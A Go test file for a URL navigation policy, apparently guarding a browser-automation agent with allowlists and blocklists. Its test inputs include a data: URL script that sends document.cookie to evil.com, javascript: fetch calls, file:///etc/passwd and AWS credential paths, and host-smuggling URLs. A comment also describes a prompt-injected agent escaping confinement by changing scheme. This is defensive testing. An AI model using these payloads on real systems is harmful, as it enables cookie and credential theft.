package navpolicy

import "testing"

func TestParseEmptyIsNil(t *testing.T) {
	if p := Parse("", ""); !p.Empty() {
		t.Fatalf("empty allow+block should yield an empty policy, got %+v", p)
	}
	if p := Parse("  ,  ", " "); !p.Empty() {
		t.Fatalf("whitespace-only lists should yield an empty policy, got %+v", p)
	}
}

func TestBlocklistMatchesDomainAndSubdomains(t *testing.T) {
	p := Parse("", "evil.com, ads.example.net")
	for _, blocked := range []string{
		"https://evil.com/x",
		"http://www.evil.com",
		"evil.com",
		"https://deep.sub.evil.com/path?q=1",
		"https://ads.example.net",
	} {
		if err := p.Check(blocked); err == nil {
			t.Errorf("expected %q to be blocked", blocked)
		}
	}
	for _, ok := range []string{
		"https://notevil.com",      // suffix must be on a dot boundary
		"https://evilcom.org",      // not a subdomain
		"https://example.net",      // parent of ads.example.net is allowed
		"https://good.example.org", // unrelated
	} {
		if err := p.Check(ok); err != nil {
			t.Errorf("expected %q to be allowed, got %v", ok, err)
		}
	}
}

func TestAllowlistOnlyPermitsListed(t *testing.T) {
	p := Parse("example.com, *.trusted.org", "")
	for _, ok := range []string{
		"https://example.com",
		"https://www.example.com/cart",
		"https://api.trusted.org",
		"trusted.org",
	} {
		if err := p.Check(ok); err != nil {
			t.Errorf("expected %q allowed, got %v", ok, err)
		}
	}
	for _, blocked := range []string{
		"https://evil.com",
		"https://example.com.attacker.net", // not the allowed apex
		"https://nottrusted.org",
	} {
		if err := p.Check(blocked); err == nil {
			t.Errorf("expected %q to be denied by allowlist", blocked)
		}
	}
}

func TestBlockWinsOverAllow(t *testing.T) {
	p := Parse("example.com", "promo.example.com")
	if err := p.Check("https://www.example.com"); err != nil {
		t.Errorf("apex subdomain should be allowed: %v", err)
	}
	if err := p.Check("https://promo.example.com"); err == nil {
		t.Errorf("blocked subdomain must lose to allowlist membership")
	}
}

// In blocklist-only mode the policy is a denylist, not confinement, so
// non-network schemes pass — they cannot match a blocked domain.
func TestNonNetworkSchemesPassInBlocklistMode(t *testing.T) {
	p := Parse("", "evil.com")
	for _, u := range []string{"about:blank", "data:text/html,<b>x</b>", "blob:abc", "", "javascript:void(0)", "file:///etc/passwd", "chrome://settings"} {
		if err := p.Check(u); err != nil {
			t.Errorf("non-network scheme %q must not be gated in blocklist mode, got %v", u, err)
		}
	}
}

// Allowlist mode is a confinement boundary: it must FAIL CLOSED on non-http
// schemes that can read local files (file:), reach browser internals (chrome:),
// or execute attacker-controlled content (data:/javascript:/blob:). A confused
// or prompt-injected agent must not be able to escape the allowlist by changing
// scheme. about:blank stays allowed as a benign blank page.
func TestAllowlistFailsClosedOnNonHTTPSchemes(t *testing.T) {
	p := Parse("example.com", "")
	for _, ok := range []string{"about:blank", "about:newtab", "", "  "} {
		if err := p.Check(ok); err != nil {
			t.Errorf("benign blank %q should be allowed, got %v", ok, err)
		}
	}
	for _, blocked := range []string{
		"file:///etc/passwd",
		"FILE:///Users/x/.aws/credentials",
		"chrome://settings",
		"chrome://net-export",
		"data:text/html,<script>fetch('https://evil.com?c='+document.cookie)</script>",
		"javascript:fetch('https://evil.com')",
		"blob:https://example.com/uuid",
		"view-source:https://example.com",
		"filesystem:https://example.com/temporary/x",
	} {
		if err := p.Check(blocked); err == nil {
			t.Errorf("allowlist must block non-http scheme %q (confinement escape)", blocked)
		}
	}
}

// The policy must not be bypassable by feeding a URL that Go's net/url rejects
// (or parses differently) but Chrome accepts. In allowlist mode such inputs
// fail closed; in blocklist mode the normalisation pins the effective host so a
// backslash/control-char trick cannot smuggle a blocked host past the check.
func TestParserDifferentialDoesNotBypass(t *testing.T) {
	allow := Parse("allowed.com", "")
	for _, blocked := range []string{
		`https://evil.com\@allowed.com/`, // Chrome host = evil.com, not allowed.com
		"https:///nohost",                // empty host
		"https://ev\til.com",             // tab stripped -> evil.com, not allowed
		"https://\nallowed.com.evil.com", // newline games
	} {
		if err := allow.Check(blocked); err == nil {
			t.Errorf("allowlist must fail closed on %q", blocked)
		}
	}

	block := Parse("", "evil.com")
	for _, blocked := range []string{
		`https://evil.com\@notblocked.com/`, // effective host is evil.com
		"https://ev\t" + "il.com/path",      // tab-stripped to evil.com
	} {
		if err := block.Check(blocked); err == nil {
			t.Errorf("blocklist must still catch %q after normalisation", blocked)
		}
	}
}

// Relative references (no scheme) are same-origin — they resolve against the
// current allowlisted page and cannot escape it — so they must pass even in
// allowlist mode (e.g. a relative brw_replay_request target). This guards
// against the fail-closed guard over-blocking legitimate same-origin requests.
func TestAllowlistPermitsRelativeReferences(t *testing.T) {
	p := Parse("corp.example.com", "")
	// These parse to an empty host (a relative path/query/fragment). A bare
	// "host/path" like "api/x" is instead treated as the host "api" (matching
	// brw_open's bare-host => https behavior) and is gated normally.
	for _, rel := range []string{"/api/data", "?q=1", "#frag"} {
		if err := p.Check(rel); err != nil {
			t.Errorf("relative reference %q is same-origin and must pass the allowlist, got %v", rel, err)
		}
	}
	// But a non-http scheme is still blocked, and an absolute off-list host too.
	if err := p.Check("file:///etc/passwd"); err == nil {
		t.Error("file: scheme must still be blocked")
	}
	if err := p.Check("https://evil.com/x"); err == nil {
		t.Error("absolute off-allowlist host must still be blocked")
	}
}

func TestSchemeDefaultsToHTTPS(t *testing.T) {
	p := Parse("", "evil.com")
	if err := p.Check("evil.com/path"); err == nil {
		t.Fatalf("a bare host should be treated as a network destination and blocked")
	}
}
